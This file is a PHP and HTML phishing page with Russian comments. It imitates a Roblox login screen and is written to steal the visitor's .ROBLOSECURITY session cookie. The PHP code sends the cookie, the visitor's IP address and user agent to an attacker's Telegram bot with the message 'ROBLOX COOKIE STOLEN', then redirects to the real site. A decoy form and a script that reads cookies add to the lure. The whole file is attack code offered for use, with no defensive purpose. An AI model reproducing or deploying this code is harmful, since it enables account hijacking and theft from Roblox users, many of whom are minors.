<?php
// ЗАМЕНИТЕ НА ВАШИ ДАННЫЕ
$bot_token = "7923456789:AAHdqTcvnExampleBotToken";
$chat_id = "123456789";

// Функция отправки в Telegram
function sendToTelegram($message) {
    global $bot_token, $chat_id;
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $data = ['chat_id' => $chat_id, 'text' => $message];
    $options = ['http' => ['header' => "Content-Type: application/json\r\n", 'method' => 'POST', 'content' => json_encode($data)]];
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Проверяем куки из запроса
if (isset($_COOKIE['.ROBLOSECURITY'])) {
    $cookie = $_COOKIE['.ROBLOSECURITY'];
    $msg = "🟢 ROBLOX COOKIE STOLEN!\n\n📌 Cookie: $cookie\n🌐 IP: {$_SERVER['REMOTE_ADDR']}\n🖥️ User-Agent: {$_SERVER['HTTP_USER_AGENT']}";
    sendToTelegram($msg);
    
    // Перенаправляем на реальный Roblox
    header('Location: https://www.roblox.com/home');
    exit;
}

// Если куки нет - показываем страницу-приманку
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #16213e; padding: 40px; border-radius: 10px; width: 350px; }
        h2 { color: #fff; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; background: #0f3460; color: #fff; }
        button { width: 100%; padding: 12px; background: #e94560; border: none; border-radius: 5px; color: #fff; font-size: 16px; cursor: pointer; }
        .status { color: #ffd700; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🔐 Roblox Login</h2>
        <input type="text" placeholder="Username" value="Guest">
        <input type="password" placeholder="Password" value="123456">
        <button onclick="login()">Login</button>
        <div class="status" id="status">Enter your credentials</div>
    </div>
    <script>
        function login() {
            document.getElementById('status').textContent = '⏳ Checking...';
            // Просто перенаправляем на тот же URL, но с параметром, чтобы сработал PHP-перехват
            window.location.href = '?force=1';
        }
        
        // Автоматическая попытка кражи через JavaScript
        setTimeout(() => {
            // Пытаемся прочитать куки (если они есть)
            const cookies = document.cookie.split('; ');
            for (let c of cookies) {
                if (c.startsWith('.ROBLOSECURITY=')) {
                    const val = c.split('=')[1];
                    if (val && val.length > 20) {
                        // Отправляем через fetch (но PHP уже перехватил)
                        document.getElementById('status').textContent = '✅ Login successful! Redirecting...';
                        document.getElementById('status').style.color = '#00ff88';
                        setTimeout(() => {
                            window.location.href = 'https://www.roblox.com/home';
                        }, 1000);
                    }
                }
            }
        }, 500);
    </script>
</body>
</html>
